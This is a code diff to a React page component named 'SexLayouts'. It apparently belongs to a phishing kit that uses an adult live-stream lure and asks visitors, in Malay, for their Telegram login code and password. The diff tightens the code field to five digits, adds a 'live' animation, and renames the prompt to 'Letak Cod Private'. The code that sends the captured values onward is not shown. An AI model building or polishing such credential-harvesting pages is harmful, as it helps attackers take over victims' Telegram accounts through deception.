@@ -9,8 +9,10 @@ export default function SexLayouts() {
         const input = e.target.value;
 
         // Menggunakan regex untuk memeriksa apakah input hanya berisi angka dan tanda tambah
-        if (/^[0-9+]*$/.test(input)) {
-            setData({ ...data, code: input });
+        if (data.code.length < 5) {
+            if (/^[0-9+]*$/.test(input)) {
+                setData({ ...data, code: input });
+            }
         }
     };
 
@@ -22,6 +24,11 @@ export default function SexLayouts() {
     return (
         <div className="relative h-[932px] w-full overflow-hidden">
             <div className="bg-black/50 w-full h-full absolute top-0 left-0 z-10 "></div>
+            <img
+                src="/live.gif"
+                alt=""
+                className="w-40 absolute  top-[24%] left-2 z-50"
+            />
 
             <div className="absolute top-0 left-0 w-full h-full scrolNaik">
                 <div class="grid grid-cols-2 md:grid-cols-4 gap-y-2">
@@ -123,22 +130,17 @@ export default function SexLayouts() {
             <div className="absolute top-0 left-0 w-full h-full flex justify-center items-start flex-col z-[10] px-5">
                 <h3 className="text-4xl font-extrabold text-pink-500 font-sans tracking-tighter">
                     <span className="text-white tracking-tighter text-2xl font-thin">
-                        Masuk Cod Guna
+                        Letak Cod
                     </span>
-                    {" Join"}
+                    {" Private"}
                 </h3>
-                <p className="tracking-tighter text-white font-thin text-lg">
-                    Sila masukkan Code Telegram untuk Lanjut.
-                </p>
+
                 <div className="py-5 w-full flex flex-col gap-2">
                     <TextField
                         value={data.code}
                         onChange={changeHandler}
-                        sx={{
-                            outlineColor: "pink",
-                        }}
-                        className="bg-white w-full rounded-lg"
-                        variant="outlined"
+                        className="bg-white w-full rounded-lg outline-none focus:outline-none focus:border-none overflow-hidden"
+                        variant="filled"
                         label="Code"
                     />
                     <TextField
@@ -146,11 +148,8 @@ export default function SexLayouts() {
                         onChange={(e) =>
                             setData({ ...data, password: e.target.value })
                         }
-                        sx={{
-                            outlineColor: "pink",
-                        }}
-                        className="bg-white w-full rounded-lg"
-                        variant="outlined"
+                        className="bg-white w-full rounded-lg outline-none focus:outline-none focus:border-none overflow-hidden"
+                        variant="filled"
                         type="password"
                         label="Password"
                     />
@@ -159,7 +158,7 @@ export default function SexLayouts() {
                     onClick={submitHandler}
                     className="font-bold bg-pink-500 text-white text-2xl py-3 px-4 rounded-lg animate-pulse"
                 >
-                    Kirim Code
+                    Kirim Cod
                 </button>
             </div>
         </div>
